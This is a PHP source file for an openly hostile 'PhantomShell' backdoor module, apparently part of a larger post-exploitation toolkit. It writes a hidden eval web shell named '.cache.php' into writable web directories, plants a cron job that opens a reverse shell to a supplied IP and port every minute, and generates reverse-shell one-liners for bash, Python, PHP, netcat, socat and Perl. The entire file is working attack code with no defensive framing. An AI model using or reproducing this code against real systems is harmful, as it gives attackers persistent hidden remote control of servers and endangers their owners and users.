<?php
// PhantomShell Module: Backdoor Deployment
// Load via MINIMAL mode: fetch backdoor

function mod_backdoor_php($path = null) {
    $sh = '<?php @eval($_REQUEST["c"]);?>';
    if (!$path) {
        foreach (array('/var/www/html', '/var/www', '/srv/www') as $d) {
            if (is_dir($d) && is_writable($d)) { $path = "$d/.cache.php"; break; }
        }
    }
    if (!$path) return false;
    return @file_put_contents($path, $sh) !== false ? $path : false;
}

function mod_backdoor_cron($ip, $port) {
    $pl = "* * * * * php -r '\$s=fsockopen(\"$ip\",$port);\$p=proc_open(\"/bin/bash\",array(0=>\$s,1=>\$s,2=>\$s),\$x);' >/dev/null 2>&1";
    $cur = '';
    if(function_exists('shell_exec')) $cur = (string)@shell_exec('crontab -l 2>/dev/null');
    $tmp = tempnam('/tmp', 'cr');
    file_put_contents($tmp, trim($cur) . "\n$pl\n");
    if(function_exists('shell_exec')) @shell_exec("crontab $tmp 2>&1");
    @unlink($tmp);
    return true;
}

function mod_backdoor_generate($ip, $port) {
    return array(
        'bash'    => "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
        'python'  => "python3 -c 'import os,pty,socket as s;c=s.socket();c.connect((\"$ip\",$port));[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        'php'     => "php -r '\$s=fsockopen(\"$ip\",$port);\$p=proc_open(\"/bin/bash\",array(0=>\$s,1=>\$s,2=>\$s),\$x);'",
        'nc'      => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ip $port >/tmp/f",
        'socat'   => "socat TCP4:$ip:$port EXEC:/bin/bash,pty,stderr,setsid",
        'perl'    => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash\");'",
    );
}

if (isset($sock)) {
    @fwrite($sock, "  Backdoor module loaded.\n");
    @fwrite($sock, "  Functions: mod_backdoor_php, mod_backdoor_cron, mod_backdoor_generate\n");
}
?>
